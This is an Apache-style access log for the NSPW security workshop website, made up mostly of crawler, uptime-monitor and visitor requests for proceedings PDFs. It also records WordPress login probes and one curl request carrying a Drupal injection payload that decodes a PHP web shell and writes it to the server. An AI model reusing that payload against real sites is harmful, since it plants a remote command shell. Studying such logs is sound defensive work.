180.76.15.151 - - [02/May/2018:14:37:32 -0400] "GET /papers/2001/nspw2001-yan.pdf HTTP/1.1" 200 510106 "-" "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)"
204.79.180.4 - - [02/May/2018:14:37:46 -0400] "GET / HTTP/1.1" 200 6108 "-" "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0;  Trident/5.0)"
204.79.180.4 - - [02/May/2018:14:37:46 -0400] "GET /modules/system/system.base.css?p7r9uw HTTP/1.1" 200 2303 "https://www.nspw.org/" "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0;  Trident/5.0)"
204.79.180.10 - - [02/May/2018:14:37:48 -0400] "GET /modules/system/system.messages.css?p7r9uw HTTP/1.1" 200 906 "https://www.nspw.org/" "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0;  Trident/5.0)"
204.79.180.10 - - [02/May/2018:14:37:48 -0400] "GET /modules/system/system.menus.css?p7r9uw HTTP/1.1" 200 1178 "https://www.nspw.org/" "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0;  Trident/5.0)"
204.79.180.10 - - [02/May/2018:14:37:48 -0400] "GET /modules/comment/comment.css?p7r9uw HTTP/1.1" 200 517 "https://www.nspw.org/" "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0;  Trident/5.0)"
204.79.180.10 - - [02/May/2018:14:37:48 -0400] "GET /modules/field/theme/field.css?p7r9uw HTTP/1.1" 200 597 "https://www.nspw.org/" "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0;  Trident/5.0)"
204.79.180.10 - - [02/May/2018:14:37:48 -0400] "GET /modules/user/user.css?p7r9uw HTTP/1.1" 200 1061 "https://www.nspw.org/" "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0;  Trident/5.0)"
204.79.180.10 - - [02/May/2018:14:37:49 -0400] "GET /modules/node/node.css?p7r9uw HTTP/1.1" 200 469 "https://www.nspw.org/" "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0;  Trident/5.0)"
204.79.180.10 - - [02/May/2018:14:37:49 -0400] "GET /themes/garland/style.css?p7r9uw HTTP/1.1" 200 5375 "https://www.nspw.org/" "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0;  Trident/5.0)"
204.79.180.10 - - [02/May/2018:14:37:49 -0400] "GET /misc/jquery.js?v=1.4.4 HTTP/1.1" 200 27630 "https://www.nspw.org/" "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0;  Trident/5.0)"
204.79.180.4 - - [02/May/2018:14:37:49 -0400] "GET /themes/garland/print.css?p7r9uw HTTP/1.1" 200 773 "https://www.nspw.org/" "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0;  Trident/5.0)"
204.79.180.4 - - [02/May/2018:14:37:49 -0400] "GET /misc/jquery.once.js?v=1.2 HTTP/1.1" 200 1445 "https://www.nspw.org/" "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0;  Trident/5.0)"
204.79.180.4 - - [02/May/2018:14:37:49 -0400] "GET /misc/drupal.js?p7r9uw HTTP/1.1" 200 7375 "https://www.nspw.org/" "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0;  Trident/5.0)"
204.79.180.10 - - [02/May/2018:14:37:49 -0400] "GET /sites/default/files/nspw-logo-smaller.jpg HTTP/1.1" 200 2554 "https://www.nspw.org/" "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0;  Trident/5.0)"
66.249.64.219 - - [02/May/2018:14:38:03 -0400] "GET /2009/proceedings/2001/nspw2001-bruschi.pdf HTTP/1.1" 200 601125 "-" "Googlebot/2.1 (+http://www.google.com/bot.html)"
204.79.180.7 - - [02/May/2018:14:38:09 -0400] "GET /modules/system/system.theme.css?p7r9uw HTTP/1.1" 200 1738 "https://www.nspw.org/" "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0;  Trident/5.0)"
204.79.180.7 - - [02/May/2018:14:38:11 -0400] "GET /themes/garland/images/body.png HTTP/1.1" 200 997 "https://www.nspw.org/" "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0;  Trident/5.0)"
204.79.180.7 - - [02/May/2018:14:38:11 -0400] "GET /themes/garland/images/bg-navigation-item-hover.png HTTP/1.1" 200 757 "https://www.nspw.org/" "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0;  Trident/5.0)"
204.79.180.7 - - [02/May/2018:14:38:12 -0400] "GET /themes/garland/images/bg-navigation-item.png HTTP/1.1" 200 821 "https://www.nspw.org/" "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0;  Trident/5.0)"
204.79.180.7 - - [02/May/2018:14:38:12 -0400] "GET /themes/garland/images/bg-content.png HTTP/1.1" 200 805 "https://www.nspw.org/" "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0;  Trident/5.0)"
204.79.180.9 - - [02/May/2018:14:38:13 -0400] "GET /themes/garland/images/menu-collapsed.gif HTTP/1.1" 200 650 "https://www.nspw.org/" "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0;  Trident/5.0)"
204.79.180.7 - - [02/May/2018:14:38:13 -0400] "GET /themes/garland/images/bg-content-right.png HTTP/1.1" 200 3178 "https://www.nspw.org/" "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0;  Trident/5.0)"
204.79.180.7 - - [02/May/2018:14:38:13 -0400] "GET /themes/garland/images/bg-content-left.png HTTP/1.1" 200 3242 "https://www.nspw.org/" "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0;  Trident/5.0)"
180.76.15.23 - - [02/May/2018:14:38:32 -0400] "GET /2009/proceedings/1994/ HTTP/1.1" 200 7507 "-" "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)"
77.88.47.40 - - [02/May/2018:14:38:10 -0400] "GET /2009/proceedings/2005/nspw2005-bishop-pos.pdf HTTP/1.1" 200 609309 "-" "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)"
69.162.124.227 - - [02/May/2018:14:39:00 -0400] "HEAD / HTTP/1.1" 200 3874 "http://nspw.org/" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
66.249.64.16 - - [02/May/2018:14:39:15 -0400] "GET /proceedings/2002 HTTP/1.1" 200 6125 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
190.50.55.48 - - [02/May/2018:14:39:41 -0400] "GET /wp-login.php HTTP/1.1" 404 7839 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
190.50.55.48 - - [02/May/2018:14:39:43 -0400] "GET / HTTP/1.1" 200 8218 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
66.249.64.219 - - [02/May/2018:14:39:47 -0400] "GET /2018 HTTP/1.1" 200 6904 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
180.76.15.16 - - [02/May/2018:14:40:32 -0400] "GET /papers/2000/nspw2000-templeton.pdf HTTP/1.1" 200 709102 "-" "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)"
117.24.38.177 - - [02/May/2018:14:40:25 -0400] "GET /papers/2010/nspw2010-bishop.pdf HTTP/1.1" 200 105523 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.106 Safari/537.36"
180.76.15.7 - - [02/May/2018:14:41:32 -0400] "GET /2005/cfp/latex/macros.sty HTTP/1.1" 200 14398 "-" "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)"
180.76.15.153 - - [02/May/2018:14:42:31 -0400] "GET /papers/2006/nspw2006-bond.pdf HTTP/1.1" 200 116715 "-" "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)"
180.76.15.28 - - [02/May/2018:14:43:32 -0400] "GET /2009/proceedings/1997/nspw1997-riechmann.pdf HTTP/1.1" 200 1167807 "-" "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)"
69.162.124.227 - - [02/May/2018:14:44:00 -0400] "HEAD / HTTP/1.1" 200 3874 "http://nspw.org/" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
177.190.190.184 - - [02/May/2018:14:44:11 -0400] "GET /wp-login.php HTTP/1.1" 404 7985 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
177.190.190.184 - - [02/May/2018:14:44:13 -0400] "GET / HTTP/1.1" 200 8206 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
180.76.15.151 - - [02/May/2018:14:44:32 -0400] "GET /papers/2006/nspw2006-crawford.pdf HTTP/1.1" 200 401254 "-" "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)"
180.76.15.135 - - [02/May/2018:14:45:32 -0400] "GET /papers/2007/?C=N;O=A HTTP/1.1" 200 7271 "-" "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)"
180.76.15.149 - - [02/May/2018:14:46:32 -0400] "GET /papers/1996/nspw1996-chuang.pdf HTTP/1.1" 200 746092 "-" "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)"
180.76.15.18 - - [02/May/2018:14:47:32 -0400] "GET /papers/1997/nspw1997-somayaji-scanned.pdf HTTP/1.1" 200 1195227 "-" "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)"
199.16.157.182 - - [02/May/2018:14:48:45 -0400] "GET /robots.txt HTTP/1.1" 200 5699 "-" "Twitterbot/1.0"
69.162.124.227 - - [02/May/2018:14:49:00 -0400] "HEAD / HTTP/1.1" 200 3874 "http://nspw.org/" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
180.76.15.160 - - [02/May/2018:14:49:32 -0400] "GET /2009/proceedings/2003/?C=N;O=D HTTP/1.1" 200 7287 "-" "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)"
77.88.47.40 - - [02/May/2018:14:50:18 -0400] "GET /node/30 HTTP/1.1" 200 7539 "-" "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)"
180.76.15.156 - - [02/May/2018:14:50:32 -0400] "GET /2004/nspw.papers.tar.gz HTTP/1.1" 200 1375505 "-" "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)"
180.76.15.26 - - [02/May/2018:14:51:32 -0400] "GET /2009/proceedings/2003/?C=N;O=A HTTP/1.1" 200 7287 "-" "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)"
77.88.47.40 - - [02/May/2018:14:51:22 -0400] "GET /2009/proceedings/2001/nspw2001-bruschi.pdf HTTP/1.1" 200 601154 "-" "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)"
37.210.195.245 - - [02/May/2018:14:52:05 -0400] "GET /wp-login.php HTTP/1.1" 404 7491 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
37.210.195.245 - - [02/May/2018:14:52:06 -0400] "GET / HTTP/1.1" 200 8218 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
66.249.64.215 - - [02/May/2018:14:52:13 -0400] "GET /proceedings/2009 HTTP/1.1" 200 6899 "-" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.96 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.64.215 - - [02/May/2018:14:53:29 -0400] "GET /papers/2010/nspw2010-lilien.pdf HTTP/1.1" 200 740643 "-" "Googlebot/2.1 (+http://www.google.com/bot.html)"
69.162.124.227 - - [02/May/2018:14:54:00 -0400] "HEAD / HTTP/1.1" 200 3874 "http://nspw.org/" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
66.249.64.215 - - [02/May/2018:14:56:06 -0400] "GET /proceedings/2006/nspw2006-porras.pdf HTTP/1.1" 404 8085 "-" "Googlebot/2.1 (+http://www.google.com/bot.html)"
207.46.13.1 - - [02/May/2018:14:56:35 -0400] "GET /papers/2006/nspw2006-crawford.pdf HTTP/1.1" 200 401756 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 7_0 like Mac OS X) AppleWebKit/537.51.1 (KHTML, like Gecko) Version/7.0 Mobile/11A465 Safari/9537.53 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
59.106.108.116 - - [02/May/2018:14:57:06 -0400] "HEAD /current/ HTTP/1.1" 200 3904 "-" "Hatena Antenna/0.5 (http://a.hatena.ne.jp/help)"
59.106.108.116 - - [02/May/2018:14:57:13 -0400] "GET /current/ HTTP/1.1" 200 12401 "-" "Hatena Antenna/0.5 (http://a.hatena.ne.jp/help)"
66.249.64.219 - - [02/May/2018:14:58:49 -0400] "GET /misc/jquery.js?v=1.4.4 HTTP/1.1" 200 30995 "https://www.nspw.org/proceedings/2009" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.64.217 - - [02/May/2018:14:58:50 -0400] "GET /misc/jquery.once.js?v=1.2 HTTP/1.1" 200 4839 "https://www.nspw.org/proceedings/2009" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
69.162.124.227 - - [02/May/2018:14:59:00 -0400] "HEAD / HTTP/1.1" 200 3874 "http://nspw.org/" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
86.137.104.111 - - [02/May/2018:15:01:43 -0400] "GET /papers/2013/nspw2013-ard.pdf HTTP/1.1" 200 498633 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 11_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/11.0 Mobile/15E148 Safari/604.1"
177.23.113.133 - - [02/May/2018:15:02:38 -0400] "GET /wp-login.php HTTP/1.1" 404 7484 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
177.23.113.133 - - [02/May/2018:15:02:39 -0400] "GET / HTTP/1.1" 200 8218 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
207.46.13.1 - - [02/May/2018:15:02:34 -0400] "GET /papers/1999/nspw1999-welch.pdf HTTP/1.1" 200 576716 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 7_0 like Mac OS X) AppleWebKit/537.51.1 (KHTML, like Gecko) Version/7.0 Mobile/11A465 Safari/9537.53 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
69.162.124.227 - - [02/May/2018:15:04:00 -0400] "HEAD / HTTP/1.1" 200 3874 "http://nspw.org/" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
66.249.64.217 - - [02/May/2018:15:04:36 -0400] "GET /2017 HTTP/1.1" 200 7052 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
72.204.25.1 - - [02/May/2018:15:04:40 -0400] "GET /wp-login.php HTTP/1.1" 404 7839 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
72.204.25.1 - - [02/May/2018:15:04:40 -0400] "GET / HTTP/1.1" 200 8218 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
77.88.47.40 - - [02/May/2018:15:05:07 -0400] "GET /2010/program HTTP/1.1" 200 7499 "-" "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)"
207.46.13.1 - - [02/May/2018:15:05:34 -0400] "GET /papers/1993/nspw1993-smith.pdf?origin=publication_detail HTTP/1.1" 200 926832 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
66.249.64.215 - - [02/May/2018:15:06:37 -0400] "GET /papers/2009/nspw2009-tuerpe.pdf HTTP/1.1" 200 375576 "-" "Googlebot/2.1 (+http://www.google.com/bot.html)"
5.255.250.67 - - [02/May/2018:15:07:26 -0400] "GET /papers/1999/?C=S;O=A HTTP/1.1" 200 4390 "-" "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)"
115.186.102.253 - - [02/May/2018:15:08:33 -0400] "GET /wp-login.php HTTP/1.1" 404 7484 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
115.186.102.253 - - [02/May/2018:15:08:33 -0400] "GET / HTTP/1.1" 200 8218 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
69.162.124.227 - - [02/May/2018:15:09:00 -0400] "HEAD / HTTP/1.1" 200 3874 "http://nspw.org/" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
31.48.106.205 - - [02/May/2018:15:09:42 -0400] "GET /wp-login.php HTTP/1.1" 404 7907 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
31.48.106.205 - - [02/May/2018:15:09:43 -0400] "GET / HTTP/1.1" 200 8218 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
222.164.201.178 - - [02/May/2018:15:11:27 -0400] "GET /wp-login.php HTTP/1.1" 404 7985 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
222.164.201.178 - - [02/May/2018:15:11:28 -0400] "GET / HTTP/1.1" 200 8206 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
204.79.180.15 - - [02/May/2018:15:09:22 -0400] "GET /papers/2013/nspw2013-crane.pdf HTTP/1.1" 200 1013933 "-" "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.0; Trident/5.0;  Trident/5.0)"
69.162.124.227 - - [02/May/2018:15:14:00 -0400] "HEAD / HTTP/1.1" 200 3874 "http://nspw.org/" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
77.88.47.40 - - [02/May/2018:15:07:30 -0400] "GET /papers/2010/nspw2010-sun.pdf HTTP/1.1" 200 2795228 "-" "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)"
59.124.153.166 - - [02/May/2018:15:15:13 -0400] "GET /?q=user/password&name[%23post_render][]=passthru&name[%23type]=markup&name[%23markup]=echo%20PD9waHAgaWYoIGlzc2V0KCAkX1JFUVVFU1RbJ2MnXSApICkgeyBzeXN0ZW0oICRfUkVRVUVTVFsnYyddIC4gJyAyPiYxJyApOyB9%20%7C%20base64%20-d%20%7C%20tee%20owotg.php HTTP/1.1" 200 6214 "-" "curl/7.47.0"
103.75.161.62 - - [02/May/2018:15:15:17 -0400] "GET /wp-login.php HTTP/1.1" 404 7484 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
103.75.161.62 - - [02/May/2018:15:15:17 -0400] "GET / HTTP/1.1" 200 8218 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
216.244.66.200 - - [02/May/2018:15:15:46 -0400] "GET /robots.txt HTTP/1.1" 200 5796 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)"
66.249.64.219 - - [02/May/2018:15:16:23 -0400] "GET /misc/jquery.js?v=1.4.4 HTTP/1.1" 200 30995 "https://www.nspw.org/2017" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.64.217 - - [02/May/2018:15:16:24 -0400] "GET /misc/jquery.once.js?v=1.2 HTTP/1.1" 200 4839 "https://www.nspw.org/2017" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.64.217 - - [02/May/2018:15:17:01 -0400] "GET /papers/2013/nspw2013-peisert.pdf HTTP/1.1" 200 712024 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
46.176.151.85 - - [02/May/2018:15:17:18 -0400] "GET /wp-login.php HTTP/1.1" 404 7484 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
46.176.151.85 - - [02/May/2018:15:17:19 -0400] "GET / HTTP/1.1" 200 8218 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
77.88.47.40 - - [02/May/2018:15:10:00 -0400] "GET /papers/2010/nspw2010-sun.pdf HTTP/1.1" 200 2960192 "-" "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)"
69.162.124.227 - - [02/May/2018:15:19:00 -0400] "HEAD / HTTP/1.1" 200 3874 "http://nspw.org/" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
141.212.122.96 - - [02/May/2018:15:19:06 -0400] "GET / HTTP/1.1" 200 6385 "http://134.117.225.17:80/" "Mozilla/5.0 zgrab/0.x"
77.88.47.40 - - [02/May/2018:15:12:30 -0400] "GET /papers/2010/nspw2010-sun.pdf HTTP/1.1" 200 2929436 "-" "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)"
77.88.47.40 - - [02/May/2018:15:21:48 -0400] "GET /2009/proceedings/1993/nspw1993-rooker-2.pdf HTTP/1.1" 200 572216 "-" "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)"
77.88.47.40 - - [02/May/2018:15:23:27 -0400] "GET /2009/proceedings/1994/?C=S;O=A HTTP/1.1" 200 4381 "-" "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)"
80.181.230.150 - - [02/May/2018:15:23:27 -0400] "GET /wp-login.php HTTP/1.1" 404 7839 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
80.181.230.150 - - [02/May/2018:15:23:29 -0400] "GET / HTTP/1.1" 200 8218 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
69.162.124.227 - - [02/May/2018:15:24:00 -0400] "HEAD / HTTP/1.1" 200 3874 "http://nspw.org/" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
77.88.47.40 - - [02/May/2018:15:24:45 -0400] "GET /2008/cfp.content.2007 HTTP/1.1" 200 12060 "-" "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)"
84.245.15.191 - - [02/May/2018:15:25:12 -0400] "GET / HTTP/1.1" 200 6427 "-" "Mozilla/5.0 (iPad; CPU OS 11_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/11.0 Mobile/15E148 Safari/604.1"
84.245.15.191 - - [02/May/2018:15:25:12 -0400] "GET /apple-touch-icon-152x152-precomposed.png HTTP/1.1" 404 3943 "-" "MobileSafari/604.1 CFNetwork/897.15 Darwin/17.5.0"
84.245.15.191 - - [02/May/2018:15:25:12 -0400] "GET /apple-touch-icon-152x152.png HTTP/1.1" 404 717 "-" "MobileSafari/604.1 CFNetwork/897.15 Darwin/17.5.0"
84.245.15.191 - - [02/May/2018:15:25:12 -0400] "GET /apple-touch-icon-precomposed.png HTTP/1.1" 404 721 "-" "MobileSafari/604.1 CFNetwork/897.15 Darwin/17.5.0"
84.245.15.191 - - [02/May/2018:15:25:13 -0400] "GET /apple-touch-icon.png HTTP/1.1" 404 709 "-" "MobileSafari/604.1 CFNetwork/897.15 Darwin/17.5.0"
84.245.15.191 - - [02/May/2018:15:25:13 -0400] "GET /favicon.ico HTTP/1.1" 404 700 "-" "MobileSafari/604.1 CFNetwork/897.15 Darwin/17.5.0"
84.245.15.191 - - [02/May/2018:15:25:13 -0400] "GET /apple-touch-icon-152x152-precomposed.png HTTP/1.1" 404 729 "-" "MobileSafari/604.1 CFNetwork/897.15 Darwin/17.5.0"
84.245.15.191 - - [02/May/2018:15:25:13 -0400] "GET /apple-touch-icon-152x152.png HTTP/1.1" 404 717 "-" "MobileSafari/604.1 CFNetwork/897.15 Darwin/17.5.0"
84.245.15.191 - - [02/May/2018:15:25:13 -0400] "GET /apple-touch-icon-precomposed.png HTTP/1.1" 404 721 "-" "MobileSafari/604.1 CFNetwork/897.15 Darwin/17.5.0"
84.245.15.191 - - [02/May/2018:15:25:13 -0400] "GET /apple-touch-icon.png HTTP/1.1" 404 709 "-" "MobileSafari/604.1 CFNetwork/897.15 Darwin/17.5.0"
84.245.15.191 - - [02/May/2018:15:25:13 -0400] "GET /favicon.ico HTTP/1.1" 404 700 "-" "MobileSafari/604.1 CFNetwork/897.15 Darwin/17.5.0"
138.97.23.97 - - [02/May/2018:15:25:17 -0400] "GET /wp-login.php HTTP/1.1" 404 7907 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
138.97.23.97 - - [02/May/2018:15:25:19 -0400] "GET / HTTP/1.1" 200 8218 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
179.127.32.68 - - [02/May/2018:15:27:05 -0400] "GET /wp-login.php HTTP/1.1" 404 7491 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
179.127.32.68 - - [02/May/2018:15:27:07 -0400] "GET / HTTP/1.1" 200 8218 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
66.249.64.217 - - [02/May/2018:15:27:33 -0400] "GET /2006/pre-proceedings/taylor.pdf HTTP/1.1" 404 8055 "-" "Googlebot/2.1 (+http://www.google.com/bot.html)"
69.162.124.227 - - [02/May/2018:15:29:00 -0400] "HEAD / HTTP/1.1" 200 3874 "http://nspw.org/" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
66.249.64.215 - - [02/May/2018:15:29:26 -0400] "GET / HTTP/1.1" 200 6609 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
184.154.189.90 - - [02/May/2018:15:31:49 -0400] "GET / HTTP/1.1" 200 6383 "http://pinter.ccsl.carleton.ca:80/" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.117 Safari/537.36"
97.106.117.212 - - [02/May/2018:15:31:59 -0400] "GET / HTTP/1.1" 200 11617 "-" "-"
196.216.220.130 - - [02/May/2018:15:32:05 -0400] "GET /papers/2013/nspw2013-peisert.pdf HTTP/1.1" 200 711968 "https://www.google.com.sl/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.139 Safari/537.36"
97.106.117.212 - - [02/May/2018:15:32:07 -0400] "GET / HTTP/1.1" 200 8287 "-" "-"
196.216.220.130 - - [02/May/2018:15:32:06 -0400] "GET /papers/2013/nspw2013-peisert.pdf HTTP/1.1" 206 276300 "https://www.google.com.sl/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.139 Safari/537.36"
97.106.117.212 - - [02/May/2018:15:32:07 -0400] "GET /2018 HTTP/1.1" 200 8932 "-" "-"
97.106.117.212 - - [02/May/2018:15:32:07 -0400] "GET /past HTTP/1.1" 200 8644 "-" "-"
97.106.117.212 - - [02/May/2018:15:32:07 -0400] "GET /proceedings HTTP/1.1" 200 9876 "-" "-"
196.216.220.130 - - [02/May/2018:15:32:07 -0400] "GET /papers/2013/nspw2013-peisert.pdf HTTP/1.1" 206 31733 "https://www.google.com.sl/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.139 Safari/537.36"
196.216.220.130 - - [02/May/2018:15:32:07 -0400] "GET /papers/2013/nspw2013-peisert.pdf HTTP/1.1" 206 59719 "https://www.google.com.sl/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.139 Safari/537.36"
97.106.117.212 - - [02/May/2018:15:32:07 -0400] "GET /login HTTP/1.1" 200 7930 "-" "-"
97.106.117.212 - - [02/May/2018:15:32:08 -0400] "GET /2018/cfp HTTP/1.1" 200 12004 "-" "-"
97.106.117.212 - - [02/May/2018:15:32:08 -0400] "GET /2018/dates HTTP/1.1" 200 7770 "-" "-"
